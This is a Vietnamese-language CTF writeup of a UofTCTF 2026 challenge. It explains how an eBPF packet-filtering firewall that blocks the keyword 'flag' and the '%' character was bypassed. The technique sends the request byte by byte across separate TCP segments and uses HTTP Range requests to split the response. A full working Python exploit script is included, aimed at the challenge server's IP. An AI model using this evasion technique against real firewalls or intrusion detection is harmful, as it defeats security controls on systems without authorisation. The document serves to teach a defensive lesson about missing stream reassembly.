---
layout: single
title: "[Writeup] UofTCTF 2026 - The eBPF Firewall Escape"
date: 2026-01-29
classes: wide
categories: [ctf, network]
tags: [firewall, ebpf, tcp-segmentation, http-range]
permalink: /writeups/uoftctf-firewall/
---

![Challenge Intro](/assets/images/uoftctf/firewall_intro.png)

## 1. Thông tin thử thách

- **Target:** `http://35.227.38.232:5000`
- **Dấu hiệu:** Truy cập `/flag.html` bị treo kết nối (Connection Timeout) hoặc bị ngắt đột ngột (Connection Reset).
- **Dữ liệu cung cấp:** Mã nguồn C của chương trình eBPF đang chạy trên máy chủ.

Mình tham gia giải UofTCTF 2026 và gặp bài Firewall này khá thú vị, nên viết writeup chia sẻ lại quá trình "vượt ngục" firewall eBPF này nhé.

---

## 2. Giai đoạn 1: Recon & Phân tích hành vi (Analysis)

Khi thực hiện lệnh `curl -v http://35.227.38.232:5000/flag.html`, mình quan sát thấy:

1. **Bắt tay TCP thành công:** Cổng 5000 mở.
2. **Request bị "Drop" hoặc "Reset":** Ngay sau khi gửi chuỗi `/flag.html`, kết nối không nhận được phản hồi.
3. **Thử nghiệm Bypass cơ bản:** Sử dụng URL Encoding (`%66lag`) cũng thất bại.

**Kết luận ban đầu:** Có một hệ thống kiểm soát gói tin (IPS) đang soi nội dung (Deep Packet Inspection - DPI) và chặn dựa trên từ khóa.

---

## 3. Giai đoạn 2: Đọc hiểu mã nguồn Firewall (eBPF Reversing)

Dựa vào code eBPF tìm được trong đề bài, mình xác định được các "luật lệ" của nó:

- **Từ khóa cấm:** `static const char blocked_kw[4] = "flag";`
- **Ký tự cấm:** `static const char blocked_char = '%';` (Chống URL Encoding).
- **Cơ chế quét:** Sử dụng `bpf_loop` để quét qua toàn bộ Payload của gói tin TCP.
- **Hành động:** `TC_ACT_SHOT` (Hủy gói tin ngay lập tức).
- **Cơ chế phân đoạn IP:** `iph->frag_off & bpf_htons(IP_MF | IP_OFFSET)` -> Chặn các gói tin bị chia nhỏ ở tầng IP (IP Fragmentation).

Đoạn code eBPF tiết lộ hai cơ chế chặn quan trọng:

1. **Chặn Ingress (Chiều vào):** Quét gói tin TCP đến, nếu payload chứa chuỗi `flag` hoặc ký tự `%` (để chống URL Encoding), gói tin bị `TC_ACT_SHOT` (hủy).
2. **Chặn Egress (Chiều ra):** Mặc dù code tập trung vào `tc/ingress`, nhưng trong thực tế CTF, các luật này thường được áp dụng cho cả hai chiều. Nếu Flag trả về chứa chữ `uoftctf{...flag...}`, nó cũng sẽ bị hủy.

**Lỗ hổng:** Firewall sử dụng `bpf_skb_load_bytes` và `memcmp` trên từng gói tin đơn lẻ. Nó không có khả năng **TCP Stream Reassembly** (ghép các gói tin lại thành một dòng dữ liệu hoàn chỉnh).

---

## 4. Giai đoạn 3: Tư duy tìm lỗ hổng & Khai thác (Exploit Strategy)

Điểm yếu cốt lõi của chương trình eBPF này là tính **Stateless (Vô trạng thái)**.

### Thử nghiệm thất bại với Curl

Mọi nỗ lực dùng `curl` với các Header giả mạo hoặc URL Encoding đều thất bại vì:
- Curl gửi toàn bộ URI `/flag.html` trong một gói tin duy nhất -> Dính chữ `flag`.
- URL Encoding dùng `%` -> Dính luật chặn ký tự `%`.

### Chiến thuật Ingress: TCP Segmentation

Để đánh lừa Firewall chiều vào, mình cần chia nhỏ Request. Thay vì gửi một gói tin lớn, mình sẽ gửi từng byte một. Firewall chỉ kiểm tra từng gói tin (packet-by-packet) nên sẽ không thấy được chuỗi cấm.

- **Gói 1:** `G`
- **Gói 2:** `E`
- ...
- **Gói n:** `/f` | **Gói n+1:** `l` | **Gói n+2:** `a` | **Gói n+3:** `g`

Vì firewall chỉ soi từng gói, nó không bao giờ thấy đủ 4 ký tự `f-l-a-g` đi liền nhau. Nginx ở phía sau sẽ nhận đủ và ghép lại thành request hợp lệ.

### Chiến thuật Egress: HTTP Range Request

Sau khi bypass được chiều vào, server trả về `200 OK` nhưng Body bị trống. Đây là dấu hiệu của **Egress Filtering**. Flag chứa từ khóa bị cấm nên gói tin trả về bị Firewall ngắt ngay lập tức.

Giải pháp là sử dụng Header `Range: bytes=start-end`. Chúng ta buộc Server phải chia nhỏ Flag trả về thành các đoạn nhỏ (ví dụ 10 byte), sao cho chữ "flag" bị ngắt đôi giữa các gói tin.

---

## 5. Script Khai thác Cuối cùng (The Final Exploit)

Đây là đoạn script hoàn chỉnh mình đã viết kết hợp cả **TCP Segmentation** (cho chiều vào) và **HTTP Range** (cho chiều ra):

```python
import socket
import time

target_ip = "35.227.38.232"
target_port = 5000

def get_range(start, end):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target_ip, target_port))
    
    # 1. BYPASS INGRESS: Gửi từng ký tự để Firewall không thấy chữ "flag"
    request = f"GET /flag.html HTTP/1.1\r\nHost: {target_ip}\r\nRange: bytes={start}-{end}\r\nConnection: close\r\n\r\n"
    for char in request:
        s.send(char.encode())
        time.sleep(0.005) # Delay nhỏ để ép tạo gói tin TCP riêng biệt
    
    response = b""
    try:
        while True:
            chunk = s.recv(1024)
            if not chunk: break
            response += chunk
    except: pass
    s.close()
    
    if b"\r\n\r\n" in response:
        return response.split(b"\r\n\r\n")[1]
    return b""

# 2. BYPASS EGRESS: Lấy từng đoạn 10 byte để chữ "flag" trong nội dung bị ngắt quãng
full_content = b""
print("[*] Starting exploit...")
for i in range(0, 214, 10):
    start, end = i, min(i + 9, 212)
    # print(f"Getting bytes {start}-{end}")
    chunk = get_range(start, end)
    full_content += chunk

print("\n[+] Full Content Recovered:")
print(full_content.decode(errors='ignore'))
```

---

## 6. Kết quả (Final Result)

Sau khi chạy script và ghép các mảnh dữ liệu nhận được, mình đã lấy được nội dung hoàn chỉnh của file `flag.html`:

> Flag: `uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}`

### Bài học rút ra:

- Firewall tầng mạng (Layer 3/4) nếu không có khả năng tái tạo dòng dữ liệu (Stream Reassembly) thì rất dễ bị bypass bằng kỹ thuật **Segmentation**.
- eBPF rất mạnh mẽ nhưng nếu lập trình logic kiểm tra chuỗi đơn giản, nó sẽ không thể chống lại các cuộc tấn công phân đoạn dữ liệu.

Cảm ơn các bạn đã đọc writeup của mình! Hẹn gặp lại ở các bài viết sau.
